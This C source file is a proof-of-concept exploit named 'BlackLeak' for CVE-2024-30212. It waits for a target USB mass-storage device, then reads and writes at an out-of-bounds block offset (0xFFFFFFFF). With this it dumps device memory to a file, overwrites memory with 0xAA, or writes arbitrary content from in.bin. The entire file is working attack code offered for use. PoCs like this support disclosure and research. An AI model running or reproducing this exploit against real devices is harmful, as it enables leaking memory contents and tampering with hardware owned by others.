/**
 * Author:    Dominik Fehr - Fehr GmbH (d@fe.hr)
 * Created:   01.09.2023
 * Credits:   Hiroka Ihara (https://github.com/ihr486/libusb-msdbot)
 * 
 * (c) Copyright by Fehr GmbH
 **/

#include <stdio.h>
#include <stdlib.h>
#include <libusb.h>
#include <time.h>
#include <stdbool.h>
#include <string.h>
#include "mass_storage.h"
#include "usb_device.h"

bool connected = false;

struct timespec {
   time_t  tv_sec; 
   long    tv_nsec;
};

#define TARGET_VID 0xDEAD
#define TARGET_PID 0xBEEF
#define BLOCKS 100
#define BLOCKSIZE 512
#define OFFSET 0xFFFFFFFF
#define LIBUSB_CHECK(action) \
do { \
  int ret = (action); \
  if (ret != LIBUSB_SUCCESS) \
  { \
    fprintf(stderr, "%s\n", libusb_strerror(ret)); \
    return -1; \
  } \
} while(0)

int hotplug_callback(struct libusb_context *ctx, struct libusb_device *dev, libusb_hotplug_event event, void *user_data) 
{
    static libusb_device_handle *dev_handle = NULL;

    if (event == LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED) 
    {
        connected = true;
    }
    else if (event == LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT) 
    {
        if (dev_handle) 
        {
            libusb_close(dev_handle);
            dev_handle = NULL;
            printf("Target device disconnected...\n");
        }
    } 
    else 
    {
        printf("Unhandled event %d\n", event);
    }

    return 0;
}

void perform_read(int totalSize) {
    uint8_t* readBuffer = (uint8_t*) malloc(totalSize);
    if (!readBuffer) {
        fprintf(stderr, "Failed to allocate memory for read buffer\n");
        return;
    }
    memset(readBuffer, 0xbb, totalSize);
    
    printf("Dumping Memory...\nReading %d blocks\n", BLOCKS);
    int ret = mass_storage_read(readBuffer, OFFSET, BLOCKS);
    printf("Read complete with status code: %d\n", ret);
    
    if (ret == 0) {
        FILE *fp = fopen("out.bin", "wb");
        if (fp) {
            fwrite(readBuffer, 1, totalSize, fp);
            fclose(fp);
            printf("Done!\n");
        } else {
            fprintf(stderr, "Failed to open output file\n");
        }
    } else {
        printf("Try again please!\n");
    }
    
    free(readBuffer);
}

void perform_write(int totalSize, int command) {
    if (command == 1) {
        uint8_t* writeBuffer = (uint8_t*) malloc(totalSize);
        if (!writeBuffer) {
            fprintf(stderr, "Failed to allocate memory for write buffer\n");
            return;
        }
        printf("Writing 0xAA to memory...\n");
        memset(writeBuffer, 0xaa, totalSize);
        int ret = mass_storage_write(writeBuffer, OFFSET, BLOCKS);
        printf("Write complete with status code: %d\n", ret);
        
        free(writeBuffer);
    } else if (command == 2) {
        uint8_t* writeBuffer = (uint8_t*) malloc(totalSize);
        if (!writeBuffer) {
            fprintf(stderr, "Failed to allocate memory for write buffer\n");
            return;
        }
        FILE *fp = fopen("in.bin", "rb");
        if (fp) {
            fread(writeBuffer, 1, totalSize, fp);
            fclose(fp);
            printf("Writing file in.bin to memory...\n");
            int ret = mass_storage_write(writeBuffer, OFFSET, BLOCKS);
            printf("Write complete with status code: %d\n", ret);
        } else {
            fprintf(stderr, "Failed to open input file\n");
        }
        free(writeBuffer);
    }
}
 
int main (int argc, char* argv[]) 
{
    if(argc != 2) 
    { 
        printf("BlackLeak - CVE-2024-30212 PoC\n##############################\nUsage:  %s\nParameters:\n-r Read Memory to out.bin\n-w Write 0xAA to memory\n-wf Write Memory from in.bin\n", argv[0]);
        return 0;
    }

    int command = -1;
    if (strcmp(argv[1], "-r") == 0) {
        printf("Read memory\n");
        command = 0;
    } else if (strcmp(argv[1], "-w") == 0) {
        printf("Write memory\n");
        command = 1;
    } else if (strcmp(argv[1], "-wf") == 0) {
        printf("Write memory from file\n");
        command = 2;
    } else {
        printf("%s is an invalid argument.\n", argv[1]);
        return 0;
    }
	
    libusb_hotplug_callback_handle callback_handle;
    libusb_init(NULL);

    if (!libusb_has_capability(LIBUSB_CAP_HAS_HOTPLUG)) 
    {
        printf("Hotplug capabilities are not supported on this platform\n");
        libusb_exit(NULL);
        return EXIT_FAILURE;
    }

    printf("Waiting for target device connection...\n");
    LIBUSB_CHECK(libusb_hotplug_register_callback(NULL, LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED |
                                                  LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT, 0, TARGET_VID, TARGET_PID,
                                                  LIBUSB_HOTPLUG_MATCH_ANY, hotplug_callback, NULL, &callback_handle));

    while (!connected) 
    {
        libusb_handle_events_completed(NULL, NULL);
        nanosleep(&(struct timespec){0, 10000000UL}, NULL);
    }
    printf("Target device connected!\n");

    int r = usb_device_open(TARGET_VID, TARGET_PID);
    if (r < 0) {
        return r;
    }
    
    int totalSize = BLOCKS * BLOCKSIZE;

    if (command == 0) {
        perform_read(totalSize);
    } else {
        perform_write(totalSize, command);
    }

    usb_device_close();
    libusb_hotplug_deregister_callback(NULL, callback_handle);
    libusb_exit(NULL);
    return EXIT_SUCCESS;
}

